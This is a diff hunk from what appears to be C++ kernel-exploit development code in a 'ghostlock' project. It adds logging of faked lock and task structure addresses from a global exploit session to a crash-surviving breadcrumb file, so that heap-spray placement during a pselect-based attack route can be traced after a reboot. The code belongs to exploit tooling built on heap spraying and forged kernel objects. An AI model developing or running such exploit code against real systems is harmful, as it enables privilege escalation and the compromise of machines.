@@ -411,6 +411,25 @@ namespace ghostlock::route::select_stack {
                 (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
                 (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));
 
+        /* Mirror the craft geometry into the fsynced breadcrumb. A route that
+         * dies inside the PI walk never flushes its log file (the page cache is
+         * lost with the reboot), so the only surviving record of which page the
+         * craft landed on is this line. */
+        {
+            std::array<char, 160> bc_line{};
+            const int32_t bc_n = snprintf(
+                bc_line.data(), bc_line.size(),
+                "psel page=%016zx lock=%016zx w0=%016zx task=%016zx shift=%d",
+                (session::g_exploit_session.heap.current.base),
+                (session::g_exploit_session.heap.current.fake_lock),
+                (session::g_exploit_session.heap.current.fake_w0),
+                (session::g_exploit_session.heap.current.fake_task),
+                route::pselect_waiter_shift(this));
+            if (bc_n > 0) {
+                support::spray_breadcrumb(bc_line.data());
+            }
+        }
+
         /* The route may replace low fds, including stdout and stderr. */
         route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                                  high_read.get(), pipe_write.get());
